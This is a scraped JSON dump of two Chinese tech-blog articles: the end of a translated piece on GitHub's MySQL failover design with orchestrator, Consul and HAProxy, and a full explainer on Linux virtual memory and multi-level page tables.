Consul 设置通信：它们都执行 KV 写操作。具有多个 orchestrator 节点的数据中心会有多个完全相同的 Consul 写操作。</p>\n<h3>整体流程</h3>\n<p>在主节点故障的场景中：</p>\n<ul>\n<li>orchestrator 节点检测到故障。</li>\n<li>orchestrator/raft 主导节点开始恢复。一个新的主节点被设置为 promoted 状态。</li>\n<li>orchestrator/raft 向所有 raft 集群节点通知主节点变更。</li>\n<li>所有 orchestrator/raft 成员接收到主节点变更的通知。每个成员都向本地 Consul 写入包含新主节点身份的 KV 记录。</li>\n<li>每个 GLB/HAProxy 都运行一个 consul 模版，用于监视 Consul KV 存储的变化，并重新配置和重新加载 HAProxy。</li>\n<li>客户端流量被重定向到新的主节点上。</li>\n</ul>\n<p>每个组件都有明确的责任归属，而且整个设计简单并且解耦。orchestrator 不需要知道负载均衡。Consul 不需要知道这些信息是从哪里来的。代理只关心 Consul，客户端只关心代理。</p>\n<p>而且：</p>\n<ul>\n<li>没有 DNS 的变更需要传播。</li>\n<li>没有 TTL。</li>\n<li>整个流程不需要原故障主节点的配合，它在很大程度上已被忽略。</li>\n</ul>\n<h3>其他细节</h3>\n<p>为了进一步确保流程的安全，我们还提供了以下内容：</p>\n<ul>\n<li>将 HAProxy 的配置项 hard-stop-after 设置为一个非常短的时间。当在写连接池中使用新的后端服务器重新加载时，它会自动终止所有到原主节点的连接。\n<ul>\n<li>通过使用 hard-stop-after 配置项，我们甚至不需要客户端的配合，这也就缓解了脑裂的情况。值得注意的是，这并不是绝对的，我们还是需要一些时间来消灭旧连接。但是，在某个时间点之后，我们就会感到舒服，因为不会出现令人厌恶的意外。</li>\n</ul>\n</li>\n<li>我们并不严格要求 Consul 随时可用。实际上，我们只需要它在故障转移期间可用。如果 Consul 恰好这时不可用，GLB 将继续使用已知的信息运作，不采用任何极端的行动。</li>\n<li>GLB 被用于验证新提升的主节点的身份。类似于我们的 <a href=\"https://githubengineering.com/context-aware-mysql-pools-via-haproxy/\" target=\"_blank\" rel=\"nofollow\">context-aware MySQL pools</a>（上下文感知的 MySQL 线程池），在后端服务器上进行检查，以确保它确实是一个可写的节点。如果我们恰好在 Consul 中删除了主节点的身份，没有问题；空的条目会被忽略。如果我们在 Consul 中错误的写入了一个非主节点的名称，没有问题；GLB 将拒绝更新它并以最后已知的状态继续运行。</li>\n</ul>\n<p>我们会在以下章节进一步完成备受关注和期望的高可用目标。</p>\n<h1>orchestrator/raft 失败检测</h1>\n<p>orchestrator使用<a href=\"https://github.com/github/orchestrator/blob/master/docs/failure-detection.md\" target=\"_blank\" rel=\"nofollow\">全面方法</a>来检测失败，因此这种方法非常可靠。我们不会观察到误报 —— 因为我们没有进行过早的故障转移，所以也不会产生不必要的中断时间。</p>\n<p>通过完全的 DC 网络隔离（又称 DC 栅栏），orchestrator/raft 进一步处理这个问题。一个 DC 网络隔离会引起一些混淆：这个 DC 中的服务器是可以互相通信的。他们是与其他 DC 网络隔离，还是其他 DC 被网络隔离？</p>\n<p>在一个 orchestrator/raft 设置中，raft 的 leader 节点就是运行故障转移的那个节点。leader 是取得了大多数节点支持的节点（特定数量）。我们的 orchestrator 节点部署就是这样，没有单一数据中心可以占大多数，任何 n-1 的 DC 也是如此。</p>\n<p>在一个完全 DC 网络隔离的事件中，这个 DC 的 orchestrator 节点与其它 DC 中的对应节点失去连接。最终，隔离 DC 中的 orchestrator 节点不能作为 raft 集群的 leader 节点。如果任何这种节点碰巧成为了 leader 节点，它就会退出。一个新的 leader 节点可以从任何一个其他 DC 分配。leader 节点会得到其他所有 DC 的支持，这些 DC 彼此之间可以进行通信。</p>\n<p>因此，调用 shots 的 orchestrator 节点将位于网络隔离数据中心之外。一个隔离 DC 应该有一个主服务器，orchestrator 会使用可用 DC 中的其中一个服务器将它替换来初始化故障转移。我们委托非隔离 DC 中的那些节点来做这个决定，以此来缓解 DC 隔离。</p>\n<h1>更快的公告</h1>\n<p>通过发出公告说主分支即将修改，可以进一步减少运行停机的总时间。如何实现这个想法？</p>\n<p>当 orchestrator 开始进行故障迁移的时候，它会观察可用于升级的服务器队列。在了解自我复制的规则，以及接受提示和限制的情况下，在最好的行动方针中，它能做出基于一定训练的决策。</p>\n<p>它可能意识到一个可以升级的服务器也是一个理想的候选策略，例如：</p>\n<ul>\n<li>没有什么可以阻止服务器的升级（潜在用户已经暗示服务器优先升级），而且</li>\n<li>认为服务器可以将它所有的版本视为复本。</li>\n</ul>\n<p>在这个例子中 orchestrator 首先将服务器设置为可写，然后立即公告服务器的升级（我们的例子中是写到了 Consul KV），即使异步开始修复复制树，这种操作通畅会花费更多几秒的运算。</p>\n<p>有可能当我们的 GLB 服务器完全重载时，复制树已经完好无损，但是这不是严格要求的。服务器可以接收到写操作！</p>\n<h2>半同步复制</h2>\n<p>在 MySQL 的<a href=\"https://dev.mysql.com/doc/refman/en/replication-semisync.html\" target=\"_blank\" rel=\"nofollow\">半同步复制</a>中，在获知更改已发送到一个或多个副本之前，主服务器不会确认事务已提交。它提供了一种实现无损故障转移的方法：应用于主服务器的任何更改都将应用于或等待应用于其中一个副本。</p>\n<p>一致性带来的成本是：可用性风险。如果没有副本确认收到更改，主服务器将被阻塞并且写入操作将停止。幸运的是，这里有一个超时设置，在这之后主服务器可以恢复到异步复制模式，使写入操作再次可用。</p>\n<p>我们已经把我们的超时设置在一个合理的低值：500ms。将更改从主服务器发送到本地 DC 副本，通常也发送到远程 DC，这个阈值是绰绰有余的。设置这个超时时间之后，我们可以观察到完美的半同步行为（无需回退到异步复制），并且在确认失败的情况下，可以在非常短的阻塞周期内获得让人满意的表现。</p>\n<p>我们在本地 DC 副本上启用半同步，并且在主服务器宕机的情况下，我们期望（尽管不严格地执行）无损故障转移。对完整的 DC 故障进行无损故障转移的代价很高昂，我们并不期待这么做。</p>\n<p>在试验半同步超时的同时，我们还观察到一种对我们有利的行为：主服务器在发生故障时，我们能够影响最佳候选人的标识。通过在指定的服务器上启用半同步，并将它们标记为候选服务器，我们可以通过影响故障的结果来减少总的停机时间。在我们的<a href=\"https://githubengineering.com/mysql-testing-automation-at-github/\" target=\"_blank\" rel=\"nofollow\">试验</a>中，我们观察到，我们通常最终会得到最佳候选服务器，并因此发布快速公告。</p>\n<h2>心跳注入</h2>\n<p>我们没有在已提升/已降级的主设备上管理 pt-heartbeat 服务的启动/关闭，作为替代，我们选择随时随地运行它。这需要进行打一些<a href=\"https://github.com/percona/percona-toolkit/pull/302/files?w=1\" rel=\"nofollow\">补丁</a>，以便使 pt-heartbeat 可以支持服务器端来回更改它们的 read_only 状态或其完全崩溃。</p>\n<p>在我们目前的设置中，在主服务器及其副本上运行 pt-heartbeat 服务。在主服务器上，他们产生心跳事件。在副本服务器上，他们识别到服务器是只读的，并定期重新检查其状态。只要服务器升级为主服务器，该服务器上的 pt-heartbeat 会将服务器标识为可写，并开始注入心跳事件。</p>\n<h2>orchestrator 所有权委托</h2>\n<p>我们进一步委托到 orchestrator：</p>\n<ul>\n<li>伪-GTID注入</li>\n<li>设置被提升的主控作为可写的，清除它的复写状态</li>\n<li>如果可能，设置老的主控为只读状态</li>\n</ul>\n<p>对于新主控，以上所有这些操作减少了冲突的可能性。一个刚刚被提升的主控应该是在线的并且可接入，否则我们就不应该提升它。然后让 orchestrator 直接应用变更到被晋升的主控上也应该是合理的。</p>\n<h2>限制和缺点</h2>\n<p>代理层使得应用程序不知道主服务器的身份，但是对于主服务器它也掩盖了应用程序的身份。所有主服务器看到的连接都来自代理层，我们丢失了关于连接实际来源的信息。</p>\n<p>随着分布式系统的发展，我们仍然遗留了未处理的场景。</p>\n<p>值得注意的是，在数据中心隔离场景中，假设主服务器位于 DC 中，DC 中的应用程序仍然能写入主服务器。一旦网络恢复正常，可能会导致状态不一致。我们正努力在非常独立的 DC 中，通过实现一个可靠的 <a href=\"https://en.wikipedia.org/wiki/STONITH\" target=\"_blank\" rel=\"nofollow\">STONITH</a> 来缓解这种脑裂。和以前一样，在将主服务器之前需要花费一些时间，可能出现短暂的脑裂。而避免脑裂的操作成本非常高。</p>\n<p>更多的场景存在：故障转移时 Consul 的终端；部分 DC 隔离；其他的。我们知道，使用这种性质的分布式系统不可能消除所有的漏洞，因此，我们将焦点放在最重要的案例上。</p>\n<h2>结果</h2>\n<p>orchestrator/GLB/Consul 设置给我们提供以下功能：</p>\n<ul>\n<li>可靠的故障检测</li>\n<li>数据中心不可知的故障迁移</li>\n<li>典型的无损故障迁移</li>\n<li>对数据中心网络隔离的支持</li>\n<li>缓解脑裂的问题（仍在实现中）</li>\n<li>无合作相关的依赖</li>\n<li>多数场景下大约 10~13 秒的断电恢复能力。（我们观察到一些场景下最长 20 秒的断电恢复和极端场景下最长 25 秒的情况）</li>\n</ul>\n<h2>结语</h2>\n<p>编排/代理/服务发现范例在解耦架构中使用众所周知的可信组件，这使得部署、运维和观察变得更加容易，并且每个组件可以独立扩展或缩减。我们将不断测试我们的设置，以继续寻求改进。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114200\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114200votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114200\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/122897caaf5c7d1b1b7bfa67a1ac43c10e67c13a.jpg"}
{"url_object_id": "341703d9c514b0daa1ffc80fbe447cf0", "title": ["Linux 的内存分页管理"], "url": "http://blog.jobbole.com/114225/", "create_date": "2018/07/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/vamei/p/9329278.html\">Vamei</a>   </div><p>内存是计算机的主存储器。内存为进程开辟出进程空间，让进程在其中保存数据。我将从内存的物理特性出发，深入到内存管理的细节，特别是了解虚拟内存和内存分页的概念。</p>\n<h3>内存</h3>\n<p>简单地说，内存就是一个数据货架。内存有一个最小的存储单位，大多数都是一个字节。内存用内存地址（memory address）来为每个字节的数据顺序编号。因此，内存地址说明了数据在内存中的位置。内存地址从0开始，每次增加1。这种线性增加的存储器地址称为线性地址（linear address）。为了方便，我们用十六进制数来表示内存地址，比如0x00000003、0x1A010CB0。这里的“0x”用来表示十六进制。“0x”后面跟着的，就是作为内存地址的十六进制数。</p>\n<p>内存地址的编号有上限。地址空间的范围和地址总线（address bus）的位数直接相关。CPU通过地址总线来向内存说明想要存取数据的地址。以英特尔32位的80386型CPU为例，这款CPU有32个针脚可以传输地址信息。每个针脚对应了一位。如果针脚上是高电压，那么这一位是1。如果是低电压，那么这一位是0。32位的电压高低信息通过地址总线传到内存的32个针脚，内存就能把电压高低信息转换成32位的二进制数，从而知道CPU想要的是哪个位置的数据。用十六进制表示，32位地址空间就是从0x00000000 到0xFFFFFFFF。</p>\n<p>内存的存储单元采用了随机读取存储器（RAM， Random Access Memory）。所谓的“随机读取”，是指存储器的读取时间和数据所在位置无关。与之相对，很多存储器的读取时间和数据所在位置有关。就拿磁带来说，我们想听其中的一首歌，必须转动带子。如果那首歌是第一首，那么立即就可以播放。如果那首歌恰巧是最后一首，我们快进到可以播放的位置就需要花很长时间。我们已经知道，进程需要调用内存中不同位置的数据。如果数据读取时间和位置相关的话，计算机就很难把控进程的运行时间。因此，随机读取的特性是内存成为主存储器的关键因素。</p>\n<p>内存提供的存储空间，除了能满足内核的运行需求，还通常能支持运行中的进程。即使进程所需空间超过内存空间，内存空间也可以通过少量拓展来弥补。换句话说，内存的存储能力，和计算机运行状态的数据总量相当。内存的缺点是不能持久地保存数据。一旦断电，内存中的数据就会消失。因此，计算机即使有了内存这样一个主存储器，还是需要硬盘这样的外部存储器来提供持久的储存空间。</p>\n<h3>虚拟内存</h3>\n<p>内存的一项主要任务，就是存储进程的相关数据。我们之前已经看到过进程空间的程序段、全局数据、栈和堆，以及这些这些存储结构在进程运行中所起到的关键作用。有趣的是，尽管进程和内存的关系如此紧密，但进程并不能直接访问内存。在Linux下，进程不能直接读写内存中地址为0x1位置的数据。进程中能访问的地址，只能是虚拟内存地址（virtual memory address）。操作系统会把虚拟内存地址翻译成真实的内存地址。这种内存管理方式，称为虚拟内存（virtual memory）。</p>\n<p>每个进程都有自己的一套虚拟内存地址，用来给自己的进程空间编号。进程空间的数据同样以字节为单位，依次增加。从功能上说，虚拟内存地址和物理内存地址类似，都是为数据提供位置索引。进程的虚拟内存地址相互独立。因此，两个进程空间可以有相同的虚拟内存地址，如0x10001000。虚拟内存地址和物理内存地址又有一定的对应关系，如图1所示。对进程某个虚拟内存地址的操作，会被CPU翻译成对某个具体内存地址的操作。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/b017014a91fca7de4a4d2432c6b7913a.png\" alt=\"\" width=\"420\" height=\"206\"></p>\n<p style=\"text-align: center\">图1 虚拟内存地址和物理内存地址的对应</p>\n<p>应用程序来说对物理内存地址一无所知。它只可能通过虚拟内存地址来进行数据读写。程序中表达的内存地址，也都是虚拟内存地址。进程对虚拟内存地址的操作，会被操作系统翻译成对某个物理内存地址的操作。由于翻译的过程由操作系统全权负责，所以应用程序可以在全过程中对物理内存地址一无所知。因此，C程序中表达的内存地址，都是虚拟内存地址。比如在C语言中，可以用下面指令来打印变量地址：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b624c6b700f5779044158\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint v = 0;\r\nprintf(\"%p\", (void*)&amp;v);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b624c6b700f5779044158-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b624c6b700f5779044158-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b624c6b700f5779044158-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b624c6b700f5779044158-2\"><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%p\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>本质上说，虚拟内存地址剥夺了应用程序自由访问物理内存地址的权利。进程对物理内存的访问，必须经过操作系统的审查。因此，掌握着内存对应关系的操作系统，也掌握了应用程序访问内存的闸门。借助虚拟内存地址，操作系统可以保障进程空间的独立性。只要操作系统把两个进程的进程空间对应到不同的内存区域，就让两个进程空间成为“老死不相往来”的两个小王国。两个进程就不可能相互篡改对方的数据，进程出错的可能性就大为减少。</p>\n<p>另一方面，有了虚拟内存地址，内存共享也变得简单。操作系统可以把同一物理内存区域对应到多个进程空间。这样，不需要任何的数据复制，多个进程就可以看到相同的数据。内核和共享库的映射，就是通过这种方式进行的。每个进程空间中，最初一部分的虚拟内存地址，都对应到物理内存中预留给内核的空间。这样，所有的进程就可以共享同一套内核数据。共享库的情况也是类似。对于任何一个共享库，计算机只需要往物理内存中加载一次，就可以通过操纵对应关系，来让多个进程共同使用。IPO中的共享内存，也有赖于虚拟内存地址。</p>\n<h3>内存分页</h3>\n<p>虚拟内存地址和物理内存地址的分离，给进程带来便利性和安全性。但虚拟内存地址和物理内存地址的翻译，又会额外耗费计算机资源。在多任务的现代计算机中，虚拟内存地址已经成为必备的设计。那么，操作系统必须要考虑清楚，如何能高效地翻译虚拟内存地址。</p>\n<p>记录对应关系最简单的办法，就是把对应关系记录在一张表中。为了让翻译速度足够地快，这个表必须加载在内存中。不过，这种记录方式惊人地浪费。如果树莓派1GB物理内存的每个字节都有一个对应记录的话，那么光是对应关系就要远远超过内存的空间。由于对应关系的条目众多，搜索到一个对应关系所需的时间也很长。这样的话，会让树莓派陷入瘫痪。</p>\n<p>因此，Linux采用了分页（paging）的方式来记录对应关系。所谓的分页，就是以更大尺寸的单位页（page）来管理内存。在Linux中，通常每页大小为4KB。如果想要获取当前树莓派的内存页大小，可以使用命令：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b624c6b70102935209589\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$getconf PAGE_SIZE</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b624c6b70102935209589-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b624c6b70102935209589-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">getconf </span><span class=\"crayon-v\">PAGE_SIZE</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n\n</div>\n<p>得到结果，即内存分页的字节数：</p>\n<blockquote><p><em id=\"__mceDel\">4096</em></p></blockquote>\n<p>返回的4096代表每个内存页可以存放4096个字节，即4KB。Linux把物理内存和进程空间都分割成页。</p>\n<p>内存分页，可以极大地减少所要记录的内存对应关系。我们已经看到，以字节为单位的对应记录实在太多。如果把物理内存和进程空间的地址都分成页，内核只需要记录页的对应关系，相关的工作量就会大为减少。由于每页的大小是每个字节的4000倍。因此，内存中的总页数只是总字节数的四千分之一。对应关系也缩减为原始策略的四千分之一。分页让虚拟内存地址的设计有了实现的可能。</p>\n<p>无论是虚拟页，还是物理页，一页之内的地址都是连续的。这样的话，一个虚拟页和一个物理页对应起来，页内的数据就可以按顺序一一对应。这意味着，虚拟内存地址和物理内存地址的末尾部分应该完全相同。大多数情况下，每一页有4096个字节。由于4096是2的12次方，所以地址最后12位的对应关系天然成立。我们把地址的这一部分称为偏移量（offset）。偏移量实际上表达了该字节在页内的位置。地址的前一部分则是页编号。操作系统只需要记录页编号的对应关系。</p>\n<p style=\"text-align: center\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/c3b996a8b26918293109b8662e1f721b.png\" alt=\"\" width=\"532\" height=\"402\"><br>\n图2 地址翻译过程</p>\n<h3>多级分页表</h3>\n<p>内存分页制度的关键，在于管理进程空间页和物理页的对应关系。操作系统把对应关系记录在分页表（page table）中。这种对应关系让上层的抽象内存和下层的物理内存分离，从而让Linux能灵活地进行内存管理。由于每个进程会有一套虚拟内存地址，那么每个进程都会有一个分页表。为了保证查询速度，分页表也会保存在内存中。分页表有很多种实现方式，最简单的一种分页表就是把所有的对应关系记录到同一个线性列表中，即如图2中的“对应关系”部分所示。</p>\n<p>这种单一的连续分页表，需要给每一个虚拟页预留一条记录的位置。但对于任何一个应用进程，其进程空间真正用到的地址都相当有限。我们还记得，进程空间会有栈和堆。进程空间为栈和堆的增长预留了地址，但栈和堆很少会占满进程空间。这意味着，如果使用连续分页表，很多条目都没有真正用到。因此，Linux中的分页表，采用了多层的数据结构。多层的分页表能够减少所需的空间。</p>\n<p>我们来看一个简化的分页设计，用以说明Linux的多层分页表。我们把地址分为了页编号和偏移量两部分，用单层的分页表记录页编号部分的对应关系。对于多层分页表来说，会进一步分割页编号为两个或更多的部分，然后用两层或更多层的分页表来记录其对应关系，如图3所示。</p>\n<p style=\"text-align: center\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/36d635123634d7505ddb1dc5f8146bfe.png\" alt=\"\" width=\"369\" height=\"444\"> 图3 多层分页表</p>\n<p style=\"text-align: center\">\n</p><p style=\"text-align: left\">在图3的例子中，页编号分成了两级。第一级对应了前8位页编号，用2个十六进制数字表示。第二级对应了后12位页编号，用3个十六进制编号。二级表记录有对应的物理页，即保存了真正的分页记录。二级表有很多张，每个二级表分页记录对应的虚拟地址前8位都相同。比如二级表0x00，里面记录的前8位都是0x00。翻译地址的过程要跨越两级。我们先取地址的前8位，在一级表中找到对应记录。该记录会告诉我们，目标二级表在内存中的位置。我们再在二级表中，通过虚拟地址的后12位，找到分页记录，从而最终找到物理地址。</p>\n<p>多层分页表就好像把完整的电话号码分成区号。我们把同一地区的电话号码以及对应的人名记录同通一个小本子上。再用一个上级本子记录区号和各个小本子的对应关系。如果某个区号没有使用，那么我们只需要在上级本子上把该区号标记为空。同样，一级分页表中0x01记录为空，说明了以0x01开头的虚拟地址段没有使用，相应的二级表就不需要存在。正是通过这一手段，多层分页表占据的空间要比单层分页表少了很多。<br>\n多层分页表还有另一个优势。单层分页表必须存在于连续的内存空间。而多层分页表的二级表，可以散步于内存的不同位置。这样的话，操作系统就可以利用零碎空间来存储分页表。还需要注意的是，这里简化了多层分页表的很多细节。最新Linux系统中的分页表多达3层，管理的内存地址也比本章介绍的长很多。不过，多层分页表的基本原理都是相同。</p>\n<p>综上，我们了解了内存以页为单位的管理方式。在分页的基础上，虚拟内存和物理内存实现了分离，从而让内核深度参与和监督内存分配。应用进程的安全性和稳定性因此大为提高。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114225\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114225votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114225\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
